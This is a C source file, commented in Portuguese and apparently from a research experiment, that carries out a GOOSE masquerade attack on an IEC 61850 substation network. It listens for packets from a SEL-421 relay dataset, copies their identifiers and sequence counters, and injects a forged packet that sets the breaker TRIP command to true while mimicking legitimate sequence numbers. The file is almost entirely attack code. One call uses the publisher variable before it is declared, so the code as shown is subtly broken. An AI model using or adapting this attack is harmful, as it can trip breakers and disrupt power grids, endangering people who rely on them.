/*
 * Ataque de mascaramento
 */

//Inclusao das bibliotecas da libiec 61850 para execucao do codigo
#include "goose_receiver.h"
#include "goose_subscriber.h"
#include "hal_thread.h"
#include "mms_value.h"
#include "goose_publisher.h"

#include <signal.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdbool.h>

static int running = 1;

//variavel global a ser utilizada na contagem de pacotes monitorados com dataset escolhido pelo atacante
int cont = 0;

//Declaracao de variaveis para armazenar o endereco mac do assinante (subscriber)
uint8_t macBuf[6];
uint8_t macdstBuf1;
uint8_t macdstBuf2;
uint8_t macdstBuf3;
uint8_t macdstBuf4;
uint8_t macdstBuf5;
uint8_t macdstBuf6;


//Decalracao de variaveis dos parametros do protocolo GOOSE
int32_t appId;
char goId[60];
char goCbRef[60];
char dataSet[60];
uint32_t confRev;
char ndsCom[60];
char simul[60];
uint32_t stNum;
uint32_t sqNum;
uint32_t timeToLive;


void sigint_handler(int signalId)
{
    running = 0;
}

//Funcao que estabelece o monitoramento da rede para capturar o pacote de um dataset determinado pelo atacante
void
gooseListener(GooseSubscriber subscriber, void* parameter)
{
   
   //Captura do dataset dos pacotes
    strcpy(dataSet, GooseSubscriber_getDataSet(subscriber));
    printf("dataSet: %s\n", dataSet);

    //Comparacao dos datasets dos pacotes capturados com o que foi deterinado pelo atacante
    if (!strcmp(dataSet, "SEL_421_distCFG/LLN0$dataset_disj"))
    {
        //Armazena o endereco de destino presente no pacote
        GooseSubscriber_getDstMac(subscriber, macBuf);
        macdstBuf1 = macBuf[0];
        macdstBuf2 = macBuf[1];
        macdstBuf3 = macBuf[2];
        macdstBuf4 = macBuf[3];
        macdstBuf5 = macBuf[4];
        macdstBuf6 = macBuf[5];

        //Armazena o valor do parâmetro goId do pacote GOOSE
        strcpy(goId,GooseSubscriber_getGoId(subscriber));

        //Armazena o valor do parâmetro goCbRef do pacote GOOSE
        strcpy(goCbRef,GooseSubscriber_getGoCbRef(subscriber));

        //Armazena o valor do parâmetro appId do pacote GOOSE
        appId = GooseSubscriber_getAppId(subscriber);

        //Armazena o valor do parâmetro stnum do pacote GOOSE
        stNum = GooseSubscriber_getStNum(subscriber);

        //Armazena o valor do parâmetro sqnum do pacote GOOSE
        sqNum = GooseSubscriber_getSqNum(subscriber);

        //Armazena o valor do parâmetro timeToLive do pacote GOOSE
        timeToLive = GooseSubscriber_getTimeAllowedToLive(subscriber);

        //Armazena o valor do parâmetro confRev do pacote GOOSE
        confRev = GooseSubscriber_getConfRev(subscriber);

        //Realiza contagem da quantidade de pacotes monitorados que tinham o mesmo dataset
        cont += 1;

        //Mostra na tela que um pacote de mesmo dataset determinado pelo atacante foi capturado
        printf(" PACOTE CAPTURADO %d\n", cont);
    }

}

int
main(int argc, char** argv)
{
    int intervalo_set = 0;
    int cont_msg = 0;

    GooseReceiver receiver = GooseReceiver_create();


    //Condicao presente no código exemplo da biblioteca libiec61850 para verificacao do uso da interface de rede
    if (argc > 1) {
        printf("Set interface id: %s\n", argv[1]);
        GooseReceiver_setInterfaceId(receiver, argv[1]);
    }
    else {
        //Na máquina utilizada no experimento foi usado a interface 3
        printf("Using interface 3\n");
        GooseReceiver_setInterfaceId(receiver, "3");
    }

    //Funcoes de configuracao da biblioteca libiec61850 para monitoramento e captura dos pacotes GOOSE da rede
    GooseSubscriber subscriber = GooseSubscriber_create("", NULL);
    GooseSubscriber_setObserver(subscriber);
    GooseSubscriber_setListener(subscriber, gooseListener, NULL);
    GooseReceiver_addSubscriber(receiver, subscriber);
    GooseReceiver_start(receiver);

    //Intervalo de quantidade de mensagens interceptadas para ser utilizada na escolha aleatória da mensagem a ser modificada no ataque
    int intervalo_inf = 1, intervalo_sup = 20;

    if (GooseReceiver_isRunning(receiver)) {
        signal(SIGINT, sigint_handler);
        while (running) {
        
            
            if (intervalo_set == 0) {
                //gera aleatoriamente o numero de mensagens para escolha da mensagem legitima a ser utilizada no ataque
                intervalo_set = (rand() % (intervalo_sup - intervalo_inf + 1) + intervalo_inf);
            }
            

            //Se o valor de contagem de pacotes capturados com dataset determinado pelo atacante for igual ao valor escolhido aleatoriamente -> sera dado inicio ao ataque com o ultimo pacote capturado
            if (cont == intervalo_set) {

                //Mostra na tela a confirmacao da contagem igual ao valor aleatório atribuído
                printf("Ataque iniciado");

                //Criacao de dataset
                LinkedList dataSetValues = LinkedList_create();

                // DEFINIR DATASET do pacote de ataque
                //O primeiro valor do comando de TRIP do disjuntor foi modificado para TRUE
                LinkedList_add(dataSetValues, MmsValue_newBoolean(true));
                //Manteve o mesmo valor FALSE para os outros comandos a partir de acionamento de botão específico do dataset utilizado
                LinkedList_add(dataSetValues, MmsValue_newBoolean(false));
                LinkedList_add(dataSetValues, MmsValue_newBoolean(false));

                //Insercao dos valores de macaddress de destino do assinante da mensagem GOOSE
                CommParameters gooseCommParameters;
                gooseCommParameters.appId = appId;
                gooseCommParameters.dstAddress[0] = macdstBuf1;
                gooseCommParameters.dstAddress[1] = macdstBuf2;
                gooseCommParameters.dstAddress[2] = macdstBuf3;
                gooseCommParameters.dstAddress[3] = macdstBuf4;
                gooseCommParameters.dstAddress[4] = macdstBuf5;
                gooseCommParameters.dstAddress[5] = macdstBuf6;
                gooseCommParameters.vlanId = 1;
                gooseCommParameters.vlanPriority = 4;

                char* interface;

                //Determinacao da interface - funcao presente no exemplo da libiec61850
                if (argc > 1)
                    interface = argv[1];
                else
                    interface = "3";

                //Valor do dataset a ser atacado determinado pelo atacante
                GoosePublisher_setDataSetRef(publisher, "SEL_421_distCFG/LLN0$dataset_disj");


                //Inserção dos valores retirados do pacote original no pacote de ataque a ser injetado
                GoosePublisher publisher = GoosePublisher_create(&gooseCommParameters, interface);
                GoosePublisher_setGoCbRef(publisher, goCbRef);
                GoosePublisher_setConfRev(publisher, confRev);
                GoosePublisher_setGoID(publisher, goId);
                GoosePublisher_setTimeAllowedToLive(publisher, timeToLive);

                //ATAQUE DE MASCARAMENTO - ao contrario do ataque de retransmissao, no ataque de mascaramento os parametros sqnum e stnum serao definidos para dissimularem um comportamento legítimo
                
                //Possibilidade 1 - Valor de sqnum eh incrementado em 1, caso nao queira simular a ocorrencia de um evento, apenas a proxima mensagem
                //Possibilidade 2 - Valor de sqnum eh zerado sqnum = 0, caso queira simular a ocorrencia de um evento
                GoosePublisher_setSqNum(publisher, sqNum+1); // escolhida a possibilidade 1

                //Possibilidade 1 - Valor de stnum eh mantido o mesmo, caso nao queira simular a ocorrencia de um evento, apenas a proxima mensagem
                //Possibilidade 2 - Valor de stnum eh incrementado em 1, caso queira simular a ocorrencia de um evento
                GoosePublisher_setStNum(publisher, stNum); // escolhida a possibilidade 1

                //Imediata Injecao do pacote de ataque na rede
                GoosePublisher_publish(publisher, dataSetValues);
                
                GoosePublisher_destroy(publisher);
                
                //Finaliza o loop
                break;
            }
            else {
                printf("\nNAO CONFIRMADO: %d\n", strlen(dataSet));
            }
        }
    }
    else {
        printf("Falha na comunicacao GOOSE\n");
    }

    //Finalizacao do monitoramento
    GooseReceiver_stop(receiver);
    GooseReceiver_destroy(receiver);

    return 0;
}